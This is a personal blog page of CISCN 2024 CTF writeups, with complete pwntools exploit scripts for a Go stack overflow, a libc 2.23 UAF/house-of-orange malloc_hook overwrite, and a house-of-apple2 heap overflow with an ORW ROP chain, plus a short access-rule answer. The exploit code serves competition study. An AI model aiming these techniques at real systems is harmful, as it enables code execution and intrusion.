<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CISCN_2024 | Y4ng's blog</title>
<meta name=keywords content="PWN,writeups,ctf"><meta name=description content="ä¿ºæ˜¯å¼±ğŸ”PWNæ‰‹"><meta name=author content="Y4ng"><link rel=canonical href=http://localhost:1313/posts/writeups/ciscn_2024/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"><link crossorigin=anonymous href=/assets/css/stylesheet.e1474971e42244c08dee58b60981bfa4e72376a0f69f168d4e9ca406b76e60bf.css integrity="sha256-4UdJceQiRMCN7li2CYG/pOcjdqD2nxaNTpykBrduYL8=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/static/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/static/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/static/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/static/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/static/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/writeups/ciscn_2024/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=text/javascript async src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["[[","]]"]],processEscapes:!0,processEnvironments:!0,skipTags:["script","noscript","style","textarea","pre"],TeX:{equationNumbers:{autoNumber:"AMS"},extensions:["AMSmath.js","AMSsymbols.js"]}},"HTML-CSS":{availableFonts:["Arial","TeX"],preferredFont:"TeX",webFont:"TeX"}}),MathJax.Hub.Queue(function(){var e,t=MathJax.Hub.getAllJax();for(e=0;e<t.length;e+=1)t[e].SourceElement().parentNode.className+=" has-jax"})</script><style>code.has-jax{font:inherit;font-size:100%;background:inherit;border:inherit;color:#515151}</style><html><head><link href=https://fonts.cdnfonts.com/css/code-new-roman rel=stylesheet><link href=https://fonts.cdnfonts.com/css/jetbrains-mono-2 rel=stylesheet><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100..900&display=swap" rel=stylesheet></head></html><meta property="og:title" content="CISCN_2024"><meta property="og:description" content="ä¿ºæ˜¯å¼±ğŸ”PWNæ‰‹"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/writeups/ciscn_2024/"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-20T12:22:41+08:00"><meta property="article:modified_time" content="2024-05-20T12:22:41+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="CISCN_2024"><meta name=twitter:description content="ä¿ºæ˜¯å¼±ğŸ”PWNæ‰‹"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"writeups","item":"http://localhost:1313/posts/writeups/"},{"@type":"ListItem","position":3,"name":"CISCN_2024","item":"http://localhost:1313/posts/writeups/ciscn_2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CISCN_2024","name":"CISCN_2024","description":"ä¿ºæ˜¯å¼±ğŸ”PWNæ‰‹","keywords":["PWN","writeups","ctf"],"articleBody":"PWN gostack é¢˜ç›®ç®€ä»‹ libc: 2.35\nexploit point: stack overflow\ngolangç¼–å†™çš„ä¸€é“æ ˆé¢˜ï¼Œæœ‰ä¸€ä¸ªæ— é™åˆ¶çš„è¾“å…¥ï¼Œé€šè¿‡gdbåŠ¨è°ƒæ‰¾å‡ºåç§»é‡ï¼Œè¦†ç›–retåœ°å€ä¸ºmain_main2ï¼Œå¼€å¯ä¸€ä¸ªbash\nexp from pwn import * binary_path = './gostack' libc_path = \"/lib/x86_64-linux-gnu/libc.so.6\" context(arch=\"amd64\",os=\"linux\",log_level=\"debug\") elf = ELF(binary_path) libc = ELF(libc_path) p=remote('8.147.128.251',30914) leak_addr = lambda name,addr: log.success(f'{name}-----\u003e'+hex(addr)) main_arena_offset = libc.symbols[\"__malloc_hook\"] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\"__free_hook\"] def debug(): gdb.attach(p) pause() def pwn(): payload = b\"a\"*256 + p64(0X4a05a0) + p64(101) payload = payload.ljust(464,b\"a\") + p64(0X4a05a0) #print(payload) p.sendline(payload) p.interactive() if __name__ == \"__main__\": pwn() orange_cat_diary é¢˜ç›®ç®€ä»‹ libc: 2.23\nexploit point: UAF\nä¼ ç»Ÿèœå•å †é¢˜ï¼Œlibc2.23ï¼ŒUAFæ¼æ´ï¼Œæœ‰ä¸€æ¬¡freeå’Œä¸€æ¬¡showï¼Œæˆ‘ä»¬åˆè¦æ³„éœ²libcåˆè¦æ‰“ä¸€æ¬¡UAFï¼Œæ˜æ˜¾ä¸€æ¬¡freeæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥é€‰æ‹©æ‰“ä¸€æ¬¡house of orangeï¼ˆå‘¼åº”ä¸Šäº†ï¼‰ï¼Œç„¶åUAFæ‰“malloc_hook\nfrom pwn import * binary_path = './orange_cat_diary' libc_path = \"./libc.so.6\" context(arch=\"amd64\",os=\"linux\",log_level=\"debug\") elf = ELF(binary_path) libc = ELF(libc_path) argv = f'' #p=process(argv=[binary_path, argv]) p=remote('8.147.129.254',12519) leak_addr = lambda name,addr: log.success(f'{name}-----\u003e'+hex(addr)) main_arena_offset = libc.symbols[\"__malloc_hook\"] + 0x10 def debug(): gdb.attach(p) pause() def cmd(idx): p.sendlineafter(b\"Please input your choice:\",str(idx)) def add(size,content): cmd(1) p.sendlineafter(b\"Please input the length of the diary content:\",str(size)) p.sendlineafter(b\"Please enter the diary content:\",content) def show(): cmd(2) def free(): cmd(3) def edit(size,content): cmd(4) p.sendlineafter(b\"Please input the length of the diary content:\",str(size)) p.sendlineafter(b\"Please enter the diary content:\\n\",content) def welcome(name): p.sendlineafter(b\"Hello, I'm delighted to meet you. Please tell me your name.\\n\",name) def pwn(): #debug() welcome(b\"y4ng\") add(0x18,b\"aaaa\") edit(0x20,b\"b\"*0x18+b\"\\xE1\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\") add(0x1000,b\"y4ng\") add(0x60,b\"\") show() libc_addr = u64(p.recv(6).ljust(8,b\"\\x00\"))-0x3c510a leak_addr(\"libc_addr\",libc_addr ) malloc_hook = libc_addr + libc.sym[\"__malloc_hook\"]-0x23 one = libc_addr+0xf03a4 free() edit(0x10,p64(malloc_hook)) add(0x60,b\"a\") add(0x60,b\"a\"*0x13+p64(one)) cmd(1) p.sendlineafter(b\"Please input the length of the diary content:\",str(0x20)) p.interactive() if __name__ == \"__main__\": pwn() ezheap æ€ä¹ˆæ˜¯ç”¨seccompå¼€çš„æ²™ç®±å•Šï¼Œä¸‹æ¬¡è®°å¾—ç”¨prctlæ‰ä¸ä¼šæœ‰è¿™ä¹ˆå¤šé‡Šæ”¾çš„heapå†…å­˜ï¼Œæ¨èæ–‡ç« seccompæ²™ç®±\né¢˜ç›®ç®€ä»‹ libc: 2.35\nexploit point: heap overflow\nå€ŸåŠ©ç©ºé—´ä¸­ç°å­˜çš„heapï¼Œæ³„éœ²å‡ºlibcå’Œheapåœ°å€ï¼Œç„¶åæ‰“house of apple2\næ¼æ´åˆ©ç”¨ å…ˆåˆ†é…ä¸€ä¸ªsize0x60çš„æŠŠtcache binæ¶ˆè€—ç©ºï¼Œç„¶åä»unsorted binä¸Šåˆ†å‰²ä¸€ä¸ªsize0x60çš„heapï¼Œç”¨æ¥æ³„æ¼libc åˆ†é…åˆ°small binä¸Šé¢0x40sizeçš„heapï¼Œæ³„æ¼å‡ºå †å—åœ°å€ exp from pwn import * binary_path = './EzHeap' libc_path = \"./libc.so.6\" context(arch=\"amd64\",os=\"linux\",log_level=\"debug\") elf = ELF(binary_path) libc = ELF(libc_path) argv = f'' p=process(argv=[binary_path, argv]) #p=remote('8.147.129.121',15268) leak_addr = lambda name,addr: log.success(f'{name}-----\u003e'+hex(addr)) main_arena_offset = libc.symbols[\"__malloc_hook\"] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\"__free_hook\"] def debug(): gdb.attach(p,\"b _IO_wdoallocbuf\") pause() def cmd(idx): p.sendlineafter(b\"choice \u003e\u003e \",str(idx)) def add(size,content): cmd(1) p.sendlineafter(b\"size:\",str(size)) p.sendlineafter(b\"content:\",content) def free(idx_): cmd(2) p.sendlineafter(b\"idx\",str(idx_)) def edit(idx,size,content): cmd(3) p.sendlineafter(b\"idx\",str(idx)) p.sendlineafter(b\"size:\",str(size)) p.sendlineafter(b\"content:\",content) def show(idx): cmd(4) p.sendlineafter(b\"idx\",str(idx)) p.recvuntil(b\"content:\") def pwn(): add(0x50,b\"y4ng\") #0 add(0x50,b\"y4ng\") #1 edit(1,0x60,b\"a\"*8*12) show(1) p.recvuntil(b\"a\"*8*12) libc_addr = u64(p.recv(6).ljust(8,b\"\\x00\")) - 0x21ace0 leak_addr(\"libc_addr\",libc_addr) edit(1,0x60,b\"a\"*8*11+p64(0x90)) for i in range(7): add(0x30,b\"y4ng\") #2-8 add(0x30,b\"y4ng\") #9 add(0x30,b\"y4ng\") #10 edit(10,0x41,b\"a\"*8*8+b\"a\") show(10) p.recvuntil(b\"a\"*8*8) heap_base = u64(p.recv(6).ljust(8,b\"\\x00\"))- 0x61 edit(10,0x48,b\"a\"*8*6+p64(0)+p64(0xf1)+p64(heap_base)) heap_base += 0x1590 #debug() pop_rdi_ret = libc_addr + 0x000000000002a3e5 pop_rsi_ret = libc_addr + 0x000000000002be51 pop_rsi_r15_ret = libc_addr + 0x000000000002a3e3 pop_rdx_r12_ret = libc_addr + 0x000000000011f2e7 pop_rax_ret = libc_addr + 0x0000000000045eb0 magic_gadget = libc_addr + 26 + 0x16a050 ''' mov rbp,QWORD PTR [rdi+0x48] mov rax,QWORD PTR [rbp+0x18] lea r13,[rbp+0x10] mov DWORD PTR [rbp+0x10],0x0 mov rdi,r13 call QWORD PTR [rax+0x28] ''' leave_ret = libc_addr + 0x000000000004da83 syscall_ret = libc_addr + libc.sym['read'] + 0x10 ret = libc_addr + 0x0000000000029139 fake_IO_addr = heap_base + 0x180 leak_addr(\"fake_IO_addr\",fake_IO_addr) rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70 orw_rop = b'./flag\\x00\\x00' orw_rop += p64(pop_rsi_r15_ret) + p64(0) + p64(fake_IO_addr - 0x10) orw_rop += p64(pop_rdi_ret) + p64(rop_address) #orw_rop += p64(pop_rsi_ret) + p64(0) orw_rop += p64(pop_rax_ret) + p64(2) orw_rop += p64(syscall_ret) orw_rop += p64(pop_rdi_ret) + p64(3) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc.sym['read']+libc_addr) orw_rop += p64(pop_rdi_ret) + p64(1) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc.sym['write']+libc_addr) payload = p64(0) + p64(leave_ret) + p64(0) + p64(libc.sym['_IO_list_all'] - 0x20 + libc_addr) payload = payload.ljust(0x38, b'\\x00') + p64(rop_address) payload = payload.ljust(0x90, b'\\x00') + p64(fake_IO_addr + 0xe0) payload = payload.ljust(0xc8, b'\\x00') + p64(libc.sym['_IO_wfile_jumps']+libc_addr) payload = payload.ljust(0xd0 + 0xe0, b'\\x00') + p64(fake_IO_addr + 0xe0 + 0xe8) payload = payload.ljust(0xd0 + 0xe8 + 0x68, b'\\x00') + p64(magic_gadget) payload += orw_rop leak_addr(\"heap_base\",heap_base) add(0x100,b\"a\") # 11 add(0x450,b\"y4ng\") # 12 add(0x450,b\"y4ng\") # 13 add(0x440,b\"y4ng\") # 14 add(0x440,b\"y4ng\") # 15 free(12) add(0x500,b\"y4ng\") # 12 free(14) p1 = b\"a\"*0x100+p64(0)+p64(0x461)+payload edit(11,len(p1),p1) add(0x500,b\"y4ng\") add(0x440,b\"y4ng\") # 15 cmd(5) p.interactive() if __name__ == \"__main__\": pwn() crypto å·¥ä¸šä¿¡æ¯ ä¸€é“å¯ä¿¡è®¡ç®—é¢˜ï¼Œå­—å¤ªå¤šäº†è®©GPTå¸®æˆ‘è¯»æ–‡æ¡£ï¼Œæ ¹æ®ä»–ç»™çš„ä»£ç ä¿®æ”¹record.listå’Œå‡½æ•°\nrecord.list { \"type\": \"MAC_LABEL\", \"subtype\": \"RECORD\" } { \"name\": \"name\", \"isleveladjust\": 0, \"isselfdefine\": 1, \"class\": \"\", \"level_fix\": 1, \"level_adjust\": 0 } { \"name\": \"ID\", \"isleveladjust\": 0, \"isselfdefine\": 1, \"class\": \"\", \"level_fix\": 1, \"level_adjust\": 0 } { \"name\": \"department\", \"isleveladjust\": 0, \"isselfdefine\": 1, \"class\": \"\", \"level_fix\": 1, \"level_adjust\": 0 } { \"name\": \"position\", \"isleveladjust\": 0, \"isselfdefine\": 1, \"class\": \"\", \"level_fix\": 1, \"level_adjust\": 0 } { \"name\": \"YOF\", \"isleveladjust\": 0, \"isselfdefine\": 1, \"class\": \"\", \"level_fix\": 1, \"level_adjust\": 0 } { \"name\": \"salary\", \"isleveladjust\": 1, \"isselfdefine\": 1, \"class\": \"F\", \"level_fix\": 0, \"level_adjust\": 0 } { \"name\": \"cell\", \"isleveladjust\": 1, \"isselfdefine\": 0, \"class\": \"\", \"level_fix\": 0, \"level_adjust\": -1 } { \"name\": \"email\", \"isleveladjust\": 1, \"isselfdefine\": 0, \"class\": \"\", \"level_fix\": 0, \"level_adjust\": -2 } fuction // add except rule check here if (strcmp(record_name, \"salary\") == 0) { // åˆ¤æ–­æ˜¯å¦æ˜¯æœ¬äººæŸ¥è¯¢ if (strcmp(read_user, record_user) == 0) { return 1; // å…è®¸è®¿é—® } } ","wordCount":"745","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-05-20T12:22:41+08:00","dateModified":"2024-05-20T12:22:41+08:00","author":[{"@type":"Person","name":"Y4ng"}],"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/writeups/ciscn_2024/"},"publisher":{"@type":"Organization","name":"Y4ng's blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/static/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/search title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=http://localhost:1313/posts title=posts><span>posts</span></a></li><li><a href=http://localhost:1313/categories title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/about/ title=about><span>about</span></a></li><li><a href=http://localhost:1313/links title=friends><span>friends</span></a></li></ul></nav></header><main class=main><article class=post autonumbering><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;Â»&nbsp;<a href=http://localhost:1313/posts/>posts</a>&nbsp;Â»&nbsp;<a href=http://localhost:1313/posts/writeups/>writeups</a></div><h1 class="post-title entry-hint-parent">CISCN_2024</h1><div class=post-description>ä¿ºæ˜¯å¼±ğŸ”PWNæ‰‹</div><div class=post-meta><span title='2024-05-20 12:22:41 +0800 CST'>2024-05-20</span>&nbsp;Â·&nbsp;4 min&nbsp;Â·&nbsp;745 words&nbsp;Â·&nbsp;Y4ng</header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#gostack>gostack</a><ul><li><a href=#é¢˜ç›®ç®€ä»‹>é¢˜ç›®ç®€ä»‹</a></li><li><a href=#exp>exp</a></li></ul></li><li><a href=#orange_cat_diary>orange_cat_diary</a><ul><li><a href=#é¢˜ç›®ç®€ä»‹-1>é¢˜ç›®ç®€ä»‹</a></li></ul></li><li><a href=#ezheap>ezheap</a><ul><li><a href=#é¢˜ç›®ç®€ä»‹-2>é¢˜ç›®ç®€ä»‹</a></li><li><a href=#æ¼æ´åˆ©ç”¨>æ¼æ´åˆ©ç”¨</a></li><li><a href=#exp-1>exp</a></li></ul></li></ul><ul><li><a href=#å·¥ä¸šä¿¡æ¯>å·¥ä¸šä¿¡æ¯</a><ul><li><a href=#recordlist>record.list</a></li><li><a href=#fuction>fuction</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h1 id=pwn>PWN<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h1><h2 id=gostack>gostack<a hidden class=anchor aria-hidden=true href=#gostack>#</a></h2><h3 id=é¢˜ç›®ç®€ä»‹>é¢˜ç›®ç®€ä»‹<a hidden class=anchor aria-hidden=true href=#é¢˜ç›®ç®€ä»‹>#</a></h3><p>libc: 2.35</p><p>exploit point: stack overflow</p><p>golangç¼–å†™çš„ä¸€é“æ ˆé¢˜ï¼Œæœ‰ä¸€ä¸ªæ— é™åˆ¶çš„è¾“å…¥ï¼Œé€šè¿‡gdbåŠ¨è°ƒæ‰¾å‡ºåç§»é‡ï¼Œè¦†ç›–retåœ°å€ä¸ºmain_main2ï¼Œå¼€å¯ä¸€ä¸ªbash</p><h3 id=exp>exp<a hidden class=anchor aria-hidden=true href=#exp>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>binary_path</span> <span class=o>=</span> <span class=s1>&#39;./gostack&#39;</span>
</span></span><span class=line><span class=cl><span class=n>libc_path</span> <span class=o>=</span> <span class=s2>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>binary_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libc_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;8.147.128.251&#39;</span><span class=p>,</span><span class=mi>30914</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span><span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>-----&gt;&#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>main_arena_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=c1>#global_max_fast_offset = 0x3c67f8</span>
</span></span><span class=line><span class=cl><span class=c1>#free_hook_offset = libc.symbols[&#34;__free_hook&#34;]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pwn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mi>256</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0X4a05a0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>464</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0X4a05a0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#print(payload)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pwn</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=orange_cat_diary>orange_cat_diary<a hidden class=anchor aria-hidden=true href=#orange_cat_diary>#</a></h2><h3 id=é¢˜ç›®ç®€ä»‹-1>é¢˜ç›®ç®€ä»‹<a hidden class=anchor aria-hidden=true href=#é¢˜ç›®ç®€ä»‹-1>#</a></h3><p>libc: 2.23</p><p>exploit point: UAF</p><p>ä¼ ç»Ÿèœå•å †é¢˜ï¼Œlibc2.23ï¼ŒUAFæ¼æ´ï¼Œæœ‰ä¸€æ¬¡freeå’Œä¸€æ¬¡showï¼Œæˆ‘ä»¬åˆè¦æ³„éœ²libcåˆè¦æ‰“ä¸€æ¬¡UAFï¼Œæ˜æ˜¾ä¸€æ¬¡freeæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥é€‰æ‹©æ‰“ä¸€æ¬¡house of orangeï¼ˆå‘¼åº”ä¸Šäº†ï¼‰ï¼Œç„¶åUAFæ‰“malloc_hook</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>binary_path</span> <span class=o>=</span> <span class=s1>&#39;./orange_cat_diary&#39;</span>
</span></span><span class=line><span class=cl><span class=n>libc_path</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>binary_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libc_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>argv</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=c1>#p=process(argv=[binary_path, argv])</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>remote</span><span class=p>(</span><span class=s1>&#39;8.147.129.254&#39;</span><span class=p>,</span><span class=mi>12519</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak_addr</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span><span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>-----&gt;&#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>main_arena_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debug</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cmd</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Please input your choice:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Please input the length of the diary content:&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Please enter the diary content:&#34;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
